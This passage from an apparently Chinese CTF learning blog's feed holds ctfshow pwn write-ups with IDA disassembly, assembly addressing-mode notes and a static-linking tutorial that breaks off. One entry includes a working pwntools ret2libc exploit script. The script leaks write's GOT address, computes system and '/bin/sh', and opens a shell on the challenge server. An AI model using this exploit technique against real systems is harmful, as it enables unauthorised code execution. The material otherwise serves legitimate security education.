   _printfmov     rax, [rbp+ptr]mov     rsi, raxlea     rdi, aHeapP     ; "heap: %p\n"mov     eax, 0call    _printflea     rax, [rbp+var_1C]mov     rsi, raxlea     rdi, aStackP    ; "stack: %p\n"mov     eax, 0call    _printflea     rdi, aAsYouCanSeeThe ; "As you can see, the protection has been"...call    _putslea     rdi, aHereIsYourFlag ; "Here is your flag:"call    _putslea     rdi, aCtfshowAddress ; "ctfshow{Address_Space_Layout_Randomizat"...call    _putsmov     rax, [rbp+ptr]mov     rdi, rax        ; ptrcall    _freemov     eax, 0mov     rdx, [rbp+var_8]xor     rdx, fs:28hjz      short locret_9F8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230725162402607.png" alt="image-20230725162402607"></p><h3 id="（三）ctfshowC源代码"><a href="#（三）ctfshowC源代码" class="headerlink" title="（三）ctfshowC源代码"></a>（三）ctfshowC源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t ctfshow(){  char buf[132]; // [esp+0h] [ebp-88h] BYREF  return read(0, buf, 0x100u);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *  # 导入pwntools库，这是一个CTF pwn（二进制漏洞利用）的工具库context.log_level = 'debug'  # 设置日志级别为debug，这样程序会打印出更多的调试信息# io = process('./pwn')  # 创建一个新的进程来运行本地的'./pwn'程序，这行被注释掉了# libc = ELF('/lib/i386-linux-gnu/libc.so.6')  # 加载本地的libc库，这行被注释掉了io = remote('pwn.challenge.ctf.show', 28145)  # 创建一个到远程服务器的连接elf = ELF('./pwn')  # 加载'./pwn'程序，获取它的信息libc = ELF('/home/ctfshow/libc/32bit/libc-2.27.so')  # 加载远程服务器上的libc库，获取它的信息ctfshow = elf.sym['ctfshow']  # 获取'ctfshow'这个函数在程序中的地址# 构造payload，包含140个"A"，然后是write函数的地址，ctfshow函数的地址，参数1，write函数的got表地址，参数4payload = "A" * 140 + p32(elf.sym['write']) + p32(ctfshow) + p32(1) + p32(elf.got['write']) + p32(4)io.send(payload)  # 发送payload到远程服务器write_addr = u32(io.recv(4))  # 从远程服务器接收4个字节，这是write函数的实际地址# 计算system函数和/bin/sh字符串在远程服务器上的实际地址system_addr = write_addr - libc.sym['write'] + libc.sym['system']binsh_addr = write_addr - libc.sym['write'] + next(libc.search('/bin/sh'))# 构造第二个payload，包含140个"B"，然后是system函数的地址，ctfshow函数的地址，/bin/sh字符串的地址payload2 = "B" * 140 + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)io.send(payload2)  # 发送第二个payload到远程服务器io.interactive()  # 进入交互模式，这样我们就可以手动输入命令到远程服务器上执行了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-计算函数的实际地址"><a href="#1-计算函数的实际地址" class="headerlink" title="1.计算函数的实际地址"></a>1.计算函数的实际地址</h4><p>首先通过泄露write函数的实际地址（write_addr），然后利用这个信息和库文件中的信息来计算其他函数和数据的实际地址。</p><p>具体来说，<code>libc.sym['write']</code>是write函数在libc库文件中的偏移量，<code>libc.sym['system']</code>是system函数在libc库文件中的偏移量，<code>next(libc.search('/bin/sh'))</code>是”/bin/sh”字符串在libc库文件中的偏移量。</p><p>所以，<code>write_addr - libc.sym['write']</code>就是libc库在内存中的基地址（因为write函数的实际地址减去它在libc库中的偏移量就等于libc库的基地址）。然后再加上其他函数或数据在libc库中的偏移量，就可以得到这些函数或数据的实际地址。</p><p>例如，<code>write_addr - libc.sym['write'] + libc.sym['system']</code>就是计算system函数的实际地址，<code>write_addr - libc.sym['write'] + next(libc.search('/bin/sh'))</code>就是计算”/bin/sh”字符串的实际地址。</p><h4 id="2-write函数泄露"><a href="#2-write函数泄露" class="headerlink" title="2.write函数泄露"></a>2.write函数泄露</h4><p>虽然<code>ctfshow()</code>函数使用了<code>read()</code>函数来从标准输入读取数据到缓冲区，但是这并不意味着我们可以通过<code>read()</code>函数来泄露地址。这是因为<code>read()</code>函数的功能是从文件描述符读取数据，而不是输出数据。在这个上下文中，文件描述符0代表标准输入。</p><p>另一方面，<code>write()</code>函数的功能是将数据写入到文件描述符。在这个上下文中，文件描述符1代表标准输出。因此，我们可以通过调用<code>write()</code>函数，将内存中的数据（例如函数的地址）写入到标准输出，从而泄露这些数据。</p><p>在这个脚本中，我们首先构造一个payload，使得程序调用<code>write()</code>函数，将<code>write()</code>函数自己在GOT表中的地址写入到标准输出。然后我们从标准输出读取这个地址，就可以得到<code>write()</code>函数的实际地址。这就是为什么我们要通过<code>write()</code>函数来泄露地址。</p><p>至于为什么要泄露<code>write()</code>函数的地址，而不是其他函数的地址，这主要是因为<code>write()</code>函数的地址在GOT表中，而GOT表是在程序的数据段，不受ASLR的影响，所以它的地址是固定的。另外，<code>write()</code>函数在libc库中，所以通过泄露<code>write()</code>函数的地址，我们就可以计算出libc库的基地址，进而计算出其他函数和数据的实际地址。</p><h2 id="十八、pwn031"><a href="#十八、pwn031" class="headerlink" title="十八、pwn031"></a>十八、pwn031</h2><h3 id="（一）汇编源代码"><a href="#（一）汇编源代码" class="headerlink" title="（一）汇编源代码"></a>（一）汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; Attributes: bp-based frame fuzzy-sp; int __cdecl main(int argc, const char **argv, const char **envp)public mainmain proc nearargc= dword ptr  8argv= dword ptr  0Chenvp= dword ptr  10h; __unwind {lea     ecx, [esp+4]and     esp, 0FFFFFFF0hpush    dword ptr [ecx-4]push    ebpmov     ebp, esppush    ebxpush    ecxcall    __x86_get_pc_thunk_bxadd     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)mov     eax, ds:(stdin_ptr - 1FC0h)[ebx]mov     eax, [eax]push    0               ; npush    1               ; modespush    0               ; bufpush    eax             ; streamcall    _setvbufadd     esp, 10hmov     eax, ds:(stdout_ptr - 1FC0h)[ebx]mov     eax, [eax]push    0               ; npush    2               ; modespush    0               ; bufpush    eax             ; streamcall    _setvbufadd     esp, 10hsub     esp, 8lea     eax, (main - 1FC0h)[ebx]push    eaxlea     eax, (unk_850 - 1FC0h)[ebx]push    eax             ; formatcall    _printfadd     esp, 10hcall    ctfshowsub     esp, 0Chlea     eax, (unk_854 - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (unk_8C8 - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (unk_944 - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (unk_9D0 - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (unk_A60 - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (unk_AE4 - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (unk_B78 - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (asc_BF4 - 1FC0h)[ebx] ; "    * *********************************"...push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (unk_C3C - 1FC0h)[ebx]push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (aTypeLinuxSecur - 1FC0h)[ebx] ; "    * Type  : Linux_Security_Mechanisms"...push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (aSiteHttpsCtfSh - 1FC0h)[ebx] ; "    * Site  : https://ctf.show/        "...push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (aHintBypassAlsr - 1FC0h)[ebx] ; "    * Hint  : Bypass ALSR &amp; PIE "push    eax             ; scall    _putsadd     esp, 10hsub     esp, 0Chlea     eax, (asc_BF4 - 1FC0h)[ebx] ; "    * *********************************"...push    eax             ; scall    _putsadd     esp, 10hsub     esp, 4push    0Eh             ; nlea     eax, (aHelloCtfshow - 1FC0h)[ebx] ; "Hello CTFshow!\n"push    eax             ; bufpush    0               ; fdcall    _writeadd     esp, 10hmov     eax, 0lea     esp, [ebp-8]pop     ecxpop     ebxpop     ebplea     esp, [ecx-4]retn; } // starts at 652main endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230726020622786.png" alt="image-20230726020622786"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、pwn013-c源代码&quot;&gt;&lt;a href=&quot;#一、pwn013-c源代码&quot; class=&quot;headerlink&quot; title=&quot;一、pwn013.c源代码&quot;&gt;&lt;/a&gt;一、pwn013.c源代码&lt;/h2&gt;&lt;pre class=&quot;line-numbers lang</summary>
      
    
    
    
    <category term="PWN入门" scheme="https://poison-biao.github.io/categories/PWN%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="PWN入门刷题" scheme="https://poison-biao.github.io/tags/PWN%E5%85%A5%E9%97%A8%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>pwn005</title>
    <link href="https://poison-biao.github.io/du-yu/pwn-begain-exerciser-02.html"/>
    <id>https://poison-biao.github.io/du-yu/pwn-begain-exerciser-02.html</id>
    <published>2023-07-14T10:48:00.000Z</published>
    <updated>2023-07-14T10:49:01.820Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN005"><a href="#PWN005" class="headerlink" title="PWN005"></a>PWN005</h1><h2 id="一、asm文件"><a href="#一、asm文件" class="headerlink" title="一、asm文件"></a>一、asm文件</h2><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">section .data             ; 这一行定义了一个名为 .data 的数据段，这个段通常用于存储程序的全局变量和静态变量。    msg db "Welcome_to_CTFshow_PWN", 0  ; 这一行在 .data 段中定义了一个名为 msg 的变量，db 表示 "define byte"，也就是定义一个字节。"Welcome_to_CTFshow_PWN" 是一个字符串，每个字符占一个字节，字符串后面的 0 表示字符串的结束符。section .text             ; 这一行定义了一个名为 .text 的文本段，这个段通常用于存储程序的代码。    global _start         ; 这一行声明了一个全局符号 _start。在 Unix-like 系统中，_start 通常是程序的入口点。_start:                   ; 这一行定义了一个标签 _start，这是程序的入口点。在这里，程序的执行将从这个位置开始。; 立即寻址方式    mov eax, 11         ; 将11赋值给eax    add eax, 114504     ; eax加上114504    sub eax, 1          ; eax减去1; 寄存器寻址方式    mov ebx, 0x36d      ; 将0x36d赋值给ebx    mov edx, ebx        ; 将ebx的值赋值给edx; 直接寻址方式    mov ecx, msg      ; 将msg的地址赋值给ecx; 寄存器间接寻址方式    mov esi, msg        ; 将msg的地址赋值给esi    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax; 寄存器相对寻址方式    mov ecx, msg        ; 将msg的地址赋值给ecx    add ecx, 4          ; 将ecx加上4    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax; 基址变址寻址方式    mov ecx, msg        ; 将msg的地址赋值给ecx    mov edx, 2          ; 将2赋值给edx    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax; 相对基址变址寻址方式    mov ecx, msg        ; 将msg的地址赋值给ecx    mov edx, 1          ; 将1赋值给edx    add ecx, 8          ; 将ecx加上8    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax; 输出字符串    mov eax, 4          ; 系统调用号4代表输出字符串    mov ebx, 1          ; 文件描述符1代表标准输出    mov ecx, msg        ; 要输出的字符串的地址    mov edx, 22         ; 要输出的字符串的长度    int 0x80            ; 调用系统调用; 退出程序    mov eax, 1          ; 系统调用号1代表退出程序    xor ebx, ebx        ; 返回值为0    int 0x80            ; 调用系统调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、获取字符串"><a href="#二、获取字符串" class="headerlink" title="二、获取字符串"></a>二、获取字符串</h2><p>1、nasm -f elf pwn005welcome_to_CTFshow.sam   （用NASM编译器将汇编文件编译为elf二进制文件）</p><p>2、ld -m elf_i386 -s -o 110pwn pwn005welcome_to_CTFshow.o  （链接成一个 32 位的、去除了符号信息的 ELF 格式的可执行文件）</p><p><code>-s</code>：这是一个选项，表示我们要去除（strip）生成的可执行文件中的所有符号信息。这可以使得生成的文件更小，但也使得调试变得更困难</p><p>3、运行文件得到字符串</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713164705629.png" alt="image-20230713164705629"></p><h2 id="三、IDA思考解析"><a href="#三、IDA思考解析" class="headerlink" title="三、IDA思考解析"></a>三、IDA思考解析</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230714182900681.png" alt="image-20230714182900681"></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">LOAD:08048000                               ; Segment type: Pure codeLOAD:08048000                               ; Segment permissions: Read/ExecuteLOAD:08048000                               LOAD segment mempage public 'CODE' use32 ; 定义一个名为 LOAD 的代码段，这个段是公开的，可以被其他模块访问，使用32位地址LOAD:08048000                               assume cs:LOAD                          ; 假设代码段寄存器 cs 指向 LOAD 段LOAD:08048000                               ;org 8048000h                            ; 设置程序的起始地址为 0x8048000LOAD:08048000                               assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing ; 假设其他段寄存器没有指向任何段，数据段寄存器 ds 指向 _data 段LOAD:08048000 7F 45 4C 46                   dword_8048000 dd 464C457Fh              ; 定义一个名为 dword_8048000 的变量，值为 0x464C457F，这是 ELF 文件的魔数LOAD:08048004 01                            db 1                                    ; 文件类别：32位LOAD:08048005 01                            db 1                                    ; 数据编码：小端LOAD:08048006 01                            db 1                                    ; 文件版本LOAD:08048007 00                            db 0                                    ; 操作系统/ABI：UNIX System V ABILOAD:08048008 00                            db 0                                    ; ABI 版本LOAD:08048009 00 00 00 00 00 00 00          db 7 dup(0)                             ; 填充字节，没有实际意义LOAD:08048010 02 00                         dw 2                                    ; 文件类型：可执行文件LOAD:08048012 03 00                         dw 3                                    ; 机器类型：Intel 386LOAD:08048014 01 00 00 00                   dd 1                                    ; 文件版本LOAD:08048018 80 80 04 08                   dd offset start                         ; 程序入口点的地址LOAD:0804801C 34 00 00 00                   dd 34h                                  ; 程序头表（Program Header Table，PHT）在文件中的偏移LOAD:08048020 18 01 00 00                   dd 118h                                 ; 节头表（Section Header Table，SHT）在文件中的偏移LOAD:08048024 00 00 00 00                   dd 0                                    ; 处理器特定的标志，对于 Intel 386，这个字段没有用LOAD:08048028 34 00                         dw 34h                                  ; ELF 头的大小LOAD:0804802A 20 00                         dw 20h                                  ; 程序头表条目的大小LOAD:0804802C 02 00                         dw 2                                    ; 程序头表的条目数LOAD:0804802E 28 00                         dw 28h                                  ; 节头表条目的大小LOAD:08048030 04 00                         dw 4                                    ; 节头表的条目数LOAD:08048032 03 00                         dw 3                                    ; 字符串表的节头表条目索引LOAD:08048034                               ; ELF32 Program HeaderLOAD:08048034                               ; PHT Entry 0LOAD:08048034 01 00 00 00                   dd 1                                    ; 类型：LOADLOAD:08048038 00 00 00 00                   dd 0                                    ; 在文件中的偏移LOAD:0804803C 00 80 04 08                   dd offset dword_8048000                 ; 虚拟地址LOAD:08048040 00 80 04 08                   dd 8048000h                             ; 物理地址LOAD:08048044 E8 00 00 00                   dd 0E8h                                 ; 在文件映像中的大小LOAD:08048048 E8 00 00 00                   dd 0E8h                                 ; 在内存映像中的大小LOAD:0804804C 05 00 00 00                   dd 5                                    ; 标志LOAD:08048050 00 10 00 00                   dd 1000h                                ; 对齐LOAD:08048054                               ; PHT Entry 1LOAD:08048054 01 00 00 00                   dd 1                                    ; 类型：LOADLOAD:08048058 E8 00 00 00                   dd 0E8h                                 ; 在文件中的偏移LOAD:0804805C E8 90 04 08                   dd offset dword_80490E8                 ; 虚拟地址LOAD:08048060 E8 90 04 08                   dd 80490E8h                             ; 物理地址LOAD:08048064 17 00 00 00                   dd 17h                                  ; 在文件映像中的大小LOAD:08048068 17 00 00 00                   dd 17h                                  ; 在内存映像中的大小LOAD:0804806C 06 00 00 00                   dd 6                                    ; 标志LOAD:08048070 00 10 00 00                   dd 1000h                                ; 对齐LOAD:08048074 00 00 00 00 00 00 00 00 00 00+align 10hLOAD:08048074 00 00                         LOAD ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230714184240261.png" alt="image-20230714184240261"></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">以下是这段代码的行注释：.data:080490E8                               ; Segment type: Pure data; 段类型：纯数据.data:080490E8                               ; Segment permissions: Read/Write; 段权限：读/写.data:080490E8                               _data segment dword public 'DATA' use32; 定义数据段，使用32位双字，公共标识为'DATA'.data:080490E8                               assume cs:_data; 假设代码段指向_data.data:080490E8                               ;org 80490E8h; 设置段的初始地址为80490E8h.data:080490E8 57 65 6C 63                   dword_80490E8 dd 636C6557h              ; DATA XREF: LOAD:0804805C↑o; 在地址80490E8上定义一个双字数据636C6557h，并标记其数据交叉引用.data:080490E8                                                                       ; start+14↑r; 数据交叉引用的偏移地址：从start开始向上偏移14.data:080490E8                                                                       ; start+1A↑o; 数据交叉引用的偏移地址：从start开始向上偏移1A.data:080490E8                                                                       ; start+21↑o; 数据交叉引用的偏移地址：从start开始向上偏移21.data:080490E8                                                                       ; start+2B↑o; 数据交叉引用的偏移地址：从start开始向上偏移2B.data:080490E8                                                                       ; start+38↑o; 数据交叉引用的偏移地址：从start开始向上偏移38.data:080490E8                                                                       ; start+53↑o; 数据交叉引用的偏移地址：从start开始向上偏移53.data:080490EC 6F 6D 65 5F 74 6F 5F 43 54 46+aOmeToCtfshowPw db 'ome_to_CTFshow_PWN',0; 在地址080490EC上定义一个字节数据，字符串为'ome_to_CTFshow_PWN'，以0结尾.data:080490EC 73 68 6F 77 5F 50 57 4E 00    _data ends; 数据段结束.data:080490EC; 一个空行，没有指令或数据.data:080490EC; 另一个空行，没有指令或数据.data:080490EC                               end start; 程序结束，start是程序的开始地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1、这部分代码是-IDA-反汇编结果中的数据段（-data）部分，主要包含了你在原始汇编代码中定义的全局变量-msg。下面是每一行的解释："><a href="#1、这部分代码是-IDA-反汇编结果中的数据段（-data）部分，主要包含了你在原始汇编代码中定义的全局变量-msg。下面是每一行的解释：" class="headerlink" title="1、这部分代码是 IDA 反汇编结果中的数据段（.data）部分，主要包含了你在原始汇编代码中定义的全局变量 msg。下面是每一行的解释："></a>1、这部分代码是 IDA 反汇编结果中的数据段（<code>.data</code>）部分，主要包含了你在原始汇编代码中定义的全局变量 <code>msg</code>。下面是每一行的解释：</h3><ul><li><p><code>.data:080490E8 57 65 6C 63 dword_80490E8 dd 636C6557h</code>：这一行定义了一个名为 <code>dword_80490E8</code> 的四字节（double word）变量，它的值是 <code>636C6557h</code>，这是一个十六进制数。这个十六进制数对应的 ASCII 字符串是 “Welc”，这是 “Welcome_to_CTFshow_PWN” 的前四个字符。<code>57 65 6C 63</code> 是 “Welc” 的十六进制 ASCII 码，它们是以小端字节序排列的，所以在这里看起来顺序是反的。</p></li><li><p>接下来的几行（<code>.data:080490E8</code>）是空行，它们没有包含任何代码。但是，这些行后面的注释（如 <code>; start+14↑r</code>）表示 <code>dword_80490E8</code> 在 <code>.text</code> 段中的引用位置。</p></li><li><p><code>.data:080490EC 6F 6D 65 5F 74 6F 5F 43 54 46+aOmeToCtfshowPw db 'ome_to_CTFshow_PWN',0</code>：这一行定义了一个字符串，它的内容是 “ome_to_CTFshow_PWN”，这是 “Welcome_to_CTFshow_PWN” 的剩余部分。<code>6F 6D 65 5F 74 6F 5F 43 54 46...</code> 是这个字符串的十六进制 ASCII 码。</p></li><li><p><code>.data:080490EC 73 68 6F 77 5F 50 57 4E 00 _data ends</code>：这一行表示数据段（<code>.data</code>）的结束。<code>73 68 6F 77 5F 50 57 4E 00</code> 是 “show_PWN” 和字符串结束符的十六进制 ASCII 码，这是 “Welcome_to_CTFshow_PWN” 的最后一部分。</p></li><li><p>最后的几行（<code>.data:080490EC end start</code>）表示程序的结束，<code>end start</code> 指定了程序的入口点是 <code>start</code>。</p></li></ul><p>总的来说，这部分代码就是 “Welcome_to_CTFshow_PWN” 这个字符串在内存中的表示形式。由于 x86 架构的 CPU 使用的是小端字节序，所以这个字符串的每四个字符被反序存储。</p><h3 id="2、DATA-XREF-LOAD-0804805C↑o和start-53↑o表示什么"><a href="#2、DATA-XREF-LOAD-0804805C↑o和start-53↑o表示什么" class="headerlink" title="2、DATA XREF: LOAD:0804805C↑o和start+53↑o表示什么"></a>2、DATA XREF: LOAD:0804805C↑o和start+53↑o表示什么</h3><p>在 IDA 的反汇编结果中，<code>DATA XREF: LOAD:0804805C↑o</code> 和 <code>start+53↑o</code> 这样的注释表示数据的交叉引用（cross-reference）。</p><ul><li><code>DATA XREF: LOAD:0804805C↑o</code>：这表示当前的数据（也就是 <code>dword_80490E8</code>）在地址 <code>0804805C</code> 的代码中被引用了。<code>XREF</code> 是 “cross-reference” 的缩写，<code>LOAD:0804805C</code> 是引用的位置，<code>↑o</code> 表示这是一个向上的引用（也就是说，引用的位置在当前位置的上方）。</li><li><code>start+53↑o</code>：这表示当前的数据在 <code>start</code> 标签后的第 53 个字节的代码中被引用了。<code>start+53</code> 是引用的位置，<code>↑o</code> 表示这是一个向上的引用。</li></ul><p>这些交叉引用信息可以帮助你理解数据在程序中的使用情况。例如，你可以通过查看 <code>dword_80490E8</code> 的交叉引用，来找出所有使用这个数据的代码。</p><h3 id="3、aOmeToCtfshowPw-："><a href="#3、aOmeToCtfshowPw-：" class="headerlink" title="3、aOmeToCtfshowPw ："></a>3、<strong>aOmeToCtfshowPw</strong> ：</h3><p>并不是一个命令，而是 IDA 在反汇编过程中，为了方便阅读，自动生成的一个<strong>标签</strong>。这个标签的名字可能会因 IDA 的版本和设置的不同而有所不同。</p><h3 id="4、dd命令和dd命令的区别："><a href="#4、dd命令和dd命令的区别：" class="headerlink" title="4、dd命令和dd命令的区别："></a>4、dd命令和dd命令的区别：</h3><p><code>db</code> 和 <code>dd</code> 是汇编语言中的伪指令，用于在数据段中定义数据。它们的含义分别是 “define byte” 和 “define doubleword”。</p><ul><li><code>db</code>：定义一个字节的数据。例如，<code>msg db 'a'</code> 将定义一个名为 <code>msg</code> 的变量，它的值是字符 ‘a’ 的 ASCII 码。</li><li><code>dd</code>：定义一个四字节（doubleword）的数据。例如，<code>num dd 1234</code> 将定义一个名为 <code>num</code> 的变量，它的值是 1234。</li></ul><p>这两个伪指令都可以用来定义字符串。例如，<code>msg db 'Hello, world!'</code> 将定义一个包含 “Hello, world!” 这个字符串的变量。然而，由于 <code>db</code> 定义的是单字节的数据，所以这个字符串中的每个字符都将占用一个字节的空间。</p><p>另一方面，<code>dd</code> 定义的是四字节的数据，所以它可以用来定义一个包含四个字符的字符串。例如，<code>msg dd 'abcd'</code> 将定义一个包含 “abcd” 这个字符串的变量。这个字符串中的每个字符都将占用一个字节的空间，但是由于 <code>dd</code> 定义的是四字节的数据，所以这四个字符将被存储在一个四字节的空间中。</p><p>总的来说，<code>db</code> 和 <code>dd</code> 的主要区别在于它们定义的数据的大小：<code>db</code> 定义的是单字节的数据，而 <code>dd</code> 定义的是四字节的数据。</p><h2 id="四、ubuntun解析"><a href="#四、ubuntun解析" class="headerlink" title="四、ubuntun解析"></a>四、ubuntun解析</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PWN005&quot;&gt;&lt;a href=&quot;#PWN005&quot; class=&quot;headerlink&quot; title=&quot;PWN005&quot;&gt;&lt;/a&gt;PWN005&lt;/h1&gt;&lt;h2 id=&quot;一、asm文件&quot;&gt;&lt;a href=&quot;#一、asm文件&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="PWN入门" scheme="https://poison-biao.github.io/categories/PWN%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="PWN入门刷题" scheme="https://poison-biao.github.io/tags/PWN%E5%85%A5%E9%97%A8%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>链接</title>
    <link href="https://poison-biao.github.io/du-yu/pwn-begain-study03.html"/>
    <id>https://poison-biao.github.io/du-yu/pwn-begain-study03.html</id>
    <published>2023-07-13T06:38:47.000Z</published>
    <updated>2023-07-13T06:44:07.543Z</updated>
    
    <content type="html"><![CDATA[<h1 id="链接（LINKING）"><a href="#链接（LINKING）" class="headerlink" title="链接（LINKING）"></a>链接（LINKING）</h1><h2 id="一、静态链接"><a href="#一、静态链接" class="headerlink" title="一、静态链接"></a>一、静态链接</h2><p>如果目标文件引用了另外一个目标文件，那么需要生成静态链接 </p><h3 id="1-创建两个C源文件"><a href="#1-创建两个C源文件" class="headerlink" title="1.创建两个C源文件"></a>1.创建两个C源文件</h3><h4 id="002linking-c"><a href="#002linking-c" class="headerlink" title="002linking.c"></a>002linking.c</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">extern int shared;extern void swap(int* a,int* b);int main(){        int a=100;        swap(&amp;a,&amp;shared);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="002linking02-c"><a href="#002linking02-c" class="headerlink" title="002linking02.c"></a>002linking02.c</h4><pre class="line-numbers language-C" data-language="C"><code class="language-C">int shared = 1;void swap(int* a,int* b){        *a ^= *b ^= *a ^= *b;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、生成目标文件"><a href="#2、生成目标文件" class="headerlink" title="2、生成目标文件"></a>2、生成目标文件</h3><p>gcc -c 002linking.c  002linking02.c -fno-stack-protector -m32   生成<strong>002linking.o</strong> 和 <strong>002linking02.o</strong>两个**.o**文件(<code>-fno-stack-protector</code>选项用于关闭栈保护)</p><h3 id="3、将两个文件链接成一个可执行文件"><a href="#3、将两个文件链接成一个可执行文件" class="headerlink" title="3、将两个文件链接成一个可执行文件"></a>3、将两个文件链接成一个可执行文件</h3><p>ld -m elf_i386 002linking.o 002linking02.o -e main -o 002linking03</p><p>注：</p><p>1.使用<code>ld</code>链接器，按照32位的Intel架构，将 002linking.o 和 002linking02.o 